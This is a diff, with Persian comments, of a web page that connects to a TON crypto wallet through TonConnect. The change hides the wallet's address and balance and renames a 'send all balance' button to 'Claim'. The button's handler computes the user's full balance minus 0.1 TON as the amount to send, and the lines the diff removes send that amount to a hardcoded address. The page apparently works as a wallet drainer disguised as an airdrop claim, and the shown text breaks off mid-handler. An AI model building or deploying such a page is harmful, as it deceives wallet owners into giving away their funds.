@@ -11,6 +11,7 @@
             text-align: center;
             background-color: #f4f4f4;
             padding: 20px;
+            position: relative;
         }
 
         .container {
@@ -22,16 +23,22 @@
             box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
         }
 
+        .wallet-button-container {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+        }
+
         button {
             background-color: #007bff;
             color: white;
             border: none;
             padding: 12px;
-            width: 100%;
             font-size: 16px;
             border-radius: 8px;
             cursor: pointer;
             margin-top: 10px;
+            width: 100%;
         }
 
         button:hover {
@@ -45,23 +52,20 @@
             border-radius: 8px;
             margin-top: 10px;
         }
-
-        .wallet-info p {
-            margin: 5px 0;
-        }
-
     </style>
 </head>
 <body>
 
+    <!-- دکمه اتصال کیف پول در بالا سمت راست -->
+    <div class="wallet-button-container">
+        <button id="connect-wallet">اتصال به کیف پول</button>
+    </div>
+
     <div class="container">
         <h2>اتصال به کیف پول</h2>
-        <button id="connect-wallet">اتصال به کیف پول</button>
 
         <div id="wallet-info" class="wallet-info">
-            <p><strong>آدرس کیف پول:</strong> <span id="wallet-address"></span></p>
-            <p><strong>موجودی:</strong> <span id="wallet-balance"></span> TON</p>
-            <button id="send-all" style="display: none;">ارسال تمام موجودی</button>
+            <button id="claim-btn" style="display: none;">Claim</button>
         </div>
     </div>
 
@@ -72,9 +76,7 @@
 
         const connectWalletBtn = document.getElementById("connect-wallet");
         const walletInfoDiv = document.getElementById("wallet-info");
-        const walletAddressSpan = document.getElementById("wallet-address");
-        const walletBalanceSpan = document.getElementById("wallet-balance");
-        const sendAllBtn = document.getElementById("send-all");
+        const claimBtn = document.getElementById("claim-btn");
 
         let userWalletAddress = "";
         let userBalance = 0;
@@ -85,29 +87,21 @@
                 // اتصال به کیف پول
                 const connectedWallet = await tonConnectUI.connectWallet();
                 userWalletAddress = connectedWallet.account.address;
-                walletAddressSpan.textContent = userWalletAddress;
                 
-                // نمایش اطلاعات کیف پول
-                walletInfoDiv.style.display = "block";
-
-                // دریافت موجودی Toncoin
+                // دریافت موجودی TON
                 const balanceResponse = await fetch(`https://tonapi.io/v2/accounts/${userWalletAddress}`);
                 const balanceData = await balanceResponse.json();
                 userBalance = balanceData.balance ? balanceData.balance / 1e9 : 0; // تبدیل nanotons به TON
                 
-                walletBalanceSpan.textContent = userBalance.toFixed(6); // نمایش ۶ رقم اعشار
+                // اگر موجودی کافی نباشد، دکمه را غیرفعال کند
+                if (userBalance <= 0.1) {
+                    alert("موجودی کافی برای انجام تراکنش وجود ندارد.");
+                    return;
+                }
 
-                // دریافت تمام موجودی‌های Jetton (توکن‌های دیگر)
-                // شما باید از API خاصی برای دریافت Jetton‌ها استفاده کنید
-                // در اینجا فقط فرض شده که موجودی Jetton‌ها را به‌طور دستی وارد می‌کنید
-                const jettonBalance = 5; // این مقدار فرضی است. باید با API واقعی جایگزین شود.
-
-                // جمع موجودی‌ها
-                const totalBalance = userBalance + jettonBalance;
-                walletBalanceSpan.textContent = totalBalance.toFixed(6); // نمایش موجودی کل
-
-                // نمایش دکمه ارسال تمام موجودی
-                sendAllBtn.style.display = "block";
+                // نمایش دکمه Claim
+                walletInfoDiv.style.display = "block";
+                claimBtn.style.display = "block";
 
             } catch (error) {
                 alert("خطا در اتصال به کیف پول");
@@ -115,37 +109,14 @@
             }
         });
 
-        // ارسال تمام موجودی به جز کارمزد تخمینی
-        sendAllBtn.addEventListener("click", async () => {
+        // ارسال تمام موجودی به جز 0.1 TON کارمزد
+        claimBtn.addEventListener("click", async () => {
             try {
-                // دریافت مقدار تخمینی کارمزد از API
-                const gasFeeEstimate = 0.1; // حدودی (میتوان مقدار دقیق را از API دریافت کرد)
-                const sendAmount = userBalance + 5 - gasFeeEstimate; // Jetton‌ها را به موجودی اضافه می‌کنیم
+                // میزان باقی‌مانده برای پرداخت کارمزد
+                const gasFeeEstimate = 0.1;
+                const sendAmount = userBalance - gasFeeEstimate;
 
                 if (sendAmount <= 0) {
-                    alert("موجودی کافی نیست! حداقل مقدار برای پرداخت کارمزد باید باقی بماند.");
+                    alert("موجودی کافی نیست! باید حداقل 0.1 TON باقی بماند.");
                     return;
-                }
-
-                const transaction = {
-                    messages: [
-                        {
-                            address: "UQDhw1z4-qGN-mEKA3ukAHRkqOmZnyeC8pYqo-nWJKalUtLW", // آدرس مقصد
-                            amount: (sendAmount * 1e9).toString(), // تبدیل TON به nanotons
-                        },
-                    ],
-                };
-
-                const result = await tonConnectUI.sendTransaction(transaction);
-                alert(`ارسال ${sendAmount.toFixed(6)} TON انجام شد!`);
-                console.log("Transaction Result:", result);
-
-            } catch (error) {
-                alert("ارسال تراکنش ناموفق بود.");
-                console.error(error);
-            }
-        });
-    </script>
-
-</body>
-</html>
+                
